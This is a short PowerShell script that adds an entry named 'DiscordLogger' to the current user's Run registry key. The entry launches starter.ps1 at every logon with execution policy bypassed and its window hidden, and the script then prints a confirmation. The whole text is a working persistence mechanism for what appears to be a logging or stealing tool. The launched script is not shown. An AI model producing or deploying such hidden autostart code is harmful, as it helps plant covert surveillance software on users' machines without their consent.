$scriptPath = "$PSScriptRoot\starter.ps1"
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

Set-ItemProperty -Path $regPath -Name "DiscordLogger" -Value "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""

Write-Output "Registry key added. The script will run at startup."
